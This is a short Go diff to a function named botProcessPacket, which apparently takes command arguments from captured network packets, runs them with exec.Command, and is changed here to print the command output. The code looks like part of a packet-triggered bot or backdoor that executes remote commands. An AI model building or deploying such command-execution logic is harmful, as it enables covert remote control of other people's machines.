@@ -40,12 +40,11 @@ func botProcessPacket(packet gopacket.Packet) {
 	args := append(flag, payload[1:]...)
 
 	fmt.Println("[+] ARGS:", args)
-	cmd := exec.Command(command, args...)
-	err := cmd.Run()
+	out, err := exec.Command(command, args...).Output()
 	if err != nil {
 		fmt.Println("[-] ERROR:", err)
 	}
-	// fmt.Println("[+] OUTPUT:", string(out))
+	fmt.Println("[+] OUTPUT:", string(out))
 }
 
 func main() {
